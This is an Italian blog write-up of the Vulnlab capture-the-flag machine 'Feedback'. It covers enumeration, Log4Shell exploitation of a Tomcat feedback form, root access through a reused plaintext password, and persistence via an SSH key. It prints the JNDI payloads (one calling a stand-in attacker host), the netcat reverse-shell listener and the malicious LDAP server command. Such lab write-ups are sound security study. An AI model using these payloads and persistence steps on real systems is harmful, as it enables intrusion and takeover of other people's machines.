+++
date = '2026-05-21T17:40:36+02:00'
draft = false
title = 'Feedback Writeup IT'
+++
**Nome**: `joy.scd01`

**Data**: `13/06/2025`

![feedback.png](/images/imgs_feedback/feedback.png)

---
# Introduzione

_Feedback_ è una macchina Linux di difficoltà _Easy_.
L'ho trovata semplice, ma interessante e molto didattica.
Espone un'istanza di **Tomcat** vulnerabile alla **Log4Shell (CVE-2021-44228)**, una delle più gravi **RCE** mai scoperte in ambienti Java.

Dopo aver ottenuto l’accesso iniziale sfruttando questa vulnerabilità, sono riuscito a leggere un file di configurazione contenente una **password in chiaro**, che si è rivelata essere **riutilizzata anche per l’utente root**, consentendomi di ottenere il pieno controllo della macchina.

---
# Tecniche utilizzate

-  **Log4Shell (CVE-2021-44228) - Remote Code Execution**
-  **Password Reuse**

---
# Enumerazione

**nmap**

Scansione mirata con script e servizi:

```bash
nmap -sC -sV feed
```

![nmap.png](/images/imgs_feedback/nmap.png)

**2 porte aperte**:
- **22/tcp** - ssh
- **8080/tcp** - http

**Web Enumeration - http://feed:8080**

Il servizio espone una pagina di **Tomcat** di default, quindi ho runnato **gobuster** per enumerare eventuali directory.

```bash
gobuster dir -u http://feed:8080 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```

![gob1.png](/images/imgs_feedback/gob1.png)

Analizzando il codice sorgente di `/feedback`, ho scoperto che:
-  L'applicazione era scritta in **Java**
-  Utilizzava **Struts2** come framework e **Log4j** per il logging.

A questo punto cercando su Google si possono trovare chiari riferimenti alla **CVE-2021-44228**, meglio conosciuta come **Log4Shell**.

Questa è una vulnerabilità critica che permette l'esecuzione remota di comandi tramite JNDI injection.
In sintesi, basta che un input controllato dall'utente venga loggato: se contiene un payload come `${jndi:ldap://attacker.com/a}` **Log4j** può eseguire codice remoto.

---
# Accesso Iniziale - CVE-2021-44228 Log4Shell → RCE

_Per sfruttare questa vulnerabilità ho utilizzato questa repository contenente il **proof-of-concept**_.

Risorsa: https://github.com/kozmer/log4j-shell-poc

Seguendo questo ordine, ho configurato:
-  **Una versione Java compatibile (jdk1.8.0_20)**

Risorsa: https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html

**Nota**: _Per installare la versione Java è necessario creare un account Oracle, come scritto nella guida, dopodichè cercare il pacchetto specifico chiamato "**Java SE Development Kit 8u20**"_.

![java.png](/images/imgs_feedback/java.png)

_Per installarlo e verificare_:

```bash
tar -xf jdk-8u20-linux-x64.tar.gz

./jdk1.8.0_20/bin/java -version
```

![javaold.png](/images/imgs_feedback/javaold.png)

Una volta confermato che l'ambiente Java era pronto, ho preparato:
- **Un listener Netcat per ricevere la reverse shell**

```bash
nc -lvnp 22667
```

-  **Un server LDAP malevolo**

```bash
python3 poc.py --userip 10.8.6.158 --webport 8000 --lport 22667
```

**Da qui mi è bastato iniettare il seguente payload**:

```text
${jndi:ldap://10.8.6.158:1389/a}
```

**In entrambi in campi del form presente su `/feedback` per triggherare la reverse shell e ottenere così l'accesso iniziale alla macchina**.

![send.png](/images/imgs_feedback/send.png)

![initialaccess.png](/images/imgs_feedback/initialaccess.png)

---
# Privilege Escalation | Password Reuse → root

Dopo aver ottenuto il foothold, come al solito, ho iniziato ad enumerare la macchina con comandi generali e cercando file contenenti informazioni sensibili.

All'interno di `/conf/tomcat-users.xml` erano presenti delle credenziali in chiaro:

```xml
<user username="admin" password="<REDACTED>" roles="manager-gui,admin-gui"/>
```

Ho provato a switchare utente, utilizzando la password trovata per **root**

```bash
su root
```

Questo è stato sufficiente per ottenere l’accesso come **root** e prendere la **root flag**.

Tuttavia, l’accesso SSH per l’utente root era limitato all’autenticazione tramite chiave pubblica.
Per garantire un accesso persistente ho quindi aggiunto la mia chiave pubblica nel file `/root/.ssh/authorized_keys`.

---
# Conclusioni finali

Come al solito, trovo le macchine di Vulnlab dei capolavori.
Fanno sempre scoprire tecniche nuove, strumenti alternativi e informazioni su scenari potenzialmente ritrovabili nel mondo reale.

**Feedback**, in particolare, mi ha permesso di approfondire la vulnerabilità critica **Log4Shell**.
Non la conoscevo in dettaglio e grazie a questa macchina ho potuto studiarne il funzionamento, comprendere come si innesca e perchè ha avuto un impatto così devastante.

**Fonti**:

-  **Github repo contenente il PoC della vulnerabilità Log4Shell** | https://github.com/kozmer/log4j-shell-poc

-  **Pagina ufficiale Oracle, dove poter scaricare la vecchia versione di Java** | https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html